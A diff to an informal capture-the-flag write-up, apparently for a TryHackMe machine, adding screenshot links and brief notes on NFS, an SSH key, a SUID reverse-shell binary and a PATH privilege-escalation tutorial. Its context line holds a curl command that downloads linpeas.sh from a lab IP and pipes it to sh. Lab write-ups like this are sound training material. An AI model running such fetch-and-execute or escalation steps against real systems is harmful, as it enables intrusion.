@@ -113,6 +113,22 @@ curl http://your_THM_IP/linpeas.sh | sh
 
 we found a option root_squash for nfs so we could try to ssh tunnel into that service.
 
+[![https://imgur.com/364hbdt.png](https://imgur.com/364hbdt.png)](https://imgur.com/364hbdt.png)
 
+[![https://imgur.com/NwY6p02.png](https://imgur.com/NwY6p02.png)](https://imgur.com/NwY6p02.png)
 
+[![https://imgur.com/QadWFuO.png](https://imgur.com/QadWFuO.png)](https://imgur.com/QadWFuO.png)
 
+James sshkey
+
+[![https://imgur.com/aBzhZ62.png](https://imgur.com/aBzhZ62.png)](https://imgur.com/aBzhZ62.png)
+
+[![https://imgur.com/MK1dtEI.png](https://imgur.com/MK1dtEI.png)](https://imgur.com/MK1dtEI.png)
+
+Our own creation of a SUID binary rev shell :D 
+
+[![https://imgur.com/TrSo1Zl.png](https://imgur.com/TrSo1Zl.png)](https://imgur.com/TrSo1Zl.png)
+
+Trying this tutorial to get something out of it but it doesnt work ..
+
+https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/
